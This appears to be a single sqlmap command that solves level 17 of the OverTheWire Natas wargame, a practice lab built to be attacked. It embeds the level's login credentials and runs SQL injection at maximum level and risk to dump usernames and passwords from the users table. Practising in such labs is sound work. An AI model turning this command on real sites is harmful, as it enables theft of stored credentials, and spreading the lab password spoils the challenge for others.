sqlmap -v 2 -u http://natas17.natas.labs.overthewire.org/index.php?debug \
--auth-type Basic --auth-cred natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw \
--dbms mysql -D natas17 -T users -C username,password \
--data "username=natas18" \
--level 5 --risk 3 \
--dump
